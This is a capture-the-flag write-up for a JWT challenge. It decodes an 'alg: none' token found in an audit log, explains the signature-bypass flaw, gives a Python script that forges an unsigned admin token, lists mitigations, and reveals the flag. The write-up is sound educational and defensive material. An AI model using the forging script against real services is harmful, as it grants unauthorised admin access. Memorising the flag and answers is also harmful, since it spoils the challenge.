# Operation Tricolor: The Forged Admin Token

**Category:** Crypto
**Difficulty:** Easy
**Points:** 100
**Platform:** CSEMA — Cyber Security Practice Lab

---

## Challenge Description

Security analysts are investigating a simulated administrative portal used to coordinate critical digital infrastructure during national celebrations. The portal uses JSON Web Tokens (JWTs) for administrator authentication. However, the application incorrectly accepts tokens using a flawed JWT algorithm. An administrator token was captured in the authentication audit logs. The mission is to analyze the captured token, understand the authentication flaw, and craft a valid administrative JWT.

**Files provided:**
- `jwt_access_audit.log`
- `auth_service_schema.json`

---

## Flag

```
TRIVARNA{jwt_alg_none_weak_hmac_bypassed_2026}
```

> **Dynamic flag** — the inner value is extracted directly from the JWT payload's `flag` field. Wrap whatever value you find in `TRIVARNA{...}`.

---

## Solution

### Step 1 — Find the Token in the Log

The log file contains thousands of noise entries. Grep for the JWT signature pattern — all JWTs begin with `eyJ` (Base64 encoding of `{"`):

```bash
grep -n "eyJ" jwt_access_audit.log
```

This returns three hits. **Line 1352** is the key one:

```
2026-08-03T20:00:00Z [WARN] [JWT-AUDIT] Intercepted admin JWT token:
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAic3lzYWRtaW4iLCAicm9sZSI6ICJhZG1pbiIsICJmbGFnIjogImZsYWd7and0X2FsZ19ub25lX3dlYWtfaG1hY19ieXBhc3NlZF8yMDI2fSJ9.
```

Notice the **trailing dot with nothing after it** — the signature segment is empty. This is the hallmark of an `alg: none` token.

---

### Step 2 — Decode the JWT

A JWT has three Base64url-encoded parts separated by dots: `header.payload.signature`. Decode each:

```python
import base64, json

jwt = "eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAic3lzYWRtaW4iLCAicm9sZSI6ICJhZG1pbiIsICJmbGFnIjogImZsYWd7and0X2FsZ19ub25lX3dlYWtfaG1hY19ieXBhc3NlZF8yMDI2fSJ9."

parts = jwt.split('.')

for i, part in enumerate(parts[:2]):
    padded = part + '=' * (4 - len(part) % 4)
    decoded = base64.b64decode(padded).decode()
    print(f"Part {i}: {decoded}")
```

**Output:**

| Part | Decoded |
|------|---------|
| Header | `{"alg": "none", "typ": "JWT"}` |
| Payload | `{"sub": "sysadmin", "role": "admin", "flag": "flag{jwt_alg_none_weak_hmac_bypassed_2026}"}` |
| Signature | *(empty)* |

**Payload fields:**

| Field | Value | Note |
|-------|-------|------|
| `alg` | `none` | No signature algorithm — server skips verification |
| `sub` | `sysadmin` | Subject claim |
| `role` | `admin` | Authorization role |
| `flag` | `flag{jwt_alg_none_weak_hmac_bypassed_2026}` | 🏁 The flag |

---

### Step 3 — The Vulnerability

The **JWT `alg: none` attack** (CWE-347: Improper Verification of Cryptographic Signature) exploits JWT libraries that dynamically select their verification algorithm based on the token's own header.

When the header declares `"alg": "none"`, a vulnerable server skips signature verification entirely:

```
Normal flow:  alg=HS256  →  server verifies HMAC signature  ✓
Attack flow:  alg=none   →  server skips all verification   ✗
```

An attacker can set any payload (`role: admin`, arbitrary `sub`) and the server accepts it as legitimate — no secret key required.

---

### Step 4 — Forging a Token (Proof of Concept)

```python
import base64, json

def b64url_encode(data: dict) -> str:
    raw = json.dumps(data, separators=(',', ':')).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "attacker", "role": "admin"}

# Empty signature — just a trailing dot
forged = f"{b64url_encode(header)}.{b64url_encode(payload)}."
print("Forged token:", forged)
```

A vulnerable server accepts this token with full admin privileges. No brute force, no secret key — zero effort.

---

## Key Takeaways

- The `alg` field in the JWT header is **attacker-controlled**. Never trust it.
- A server that dynamically selects its verification algorithm from the token header is fundamentally broken.
- The flag was stored in plain text inside the JWT payload — readable by simply Base64-decoding, no crypto needed.

---

## Mitigations

- **Whitelist algorithms server-side** — explicitly allow only `HS256` or `RS256`; reject `none` and any unexpected algorithm.
- **Never read `alg` from the token header** — the algorithm must be a server-side constant.
- **Use a vetted library** — modern versions of `PyJWT (≥2.x)`, `python-jose`, and `jsonwebtoken (≥9.x)` reject `alg: none` by default.
- **Validate all claims** — always verify `exp`, `iss`, and `aud` regardless of signature validity.
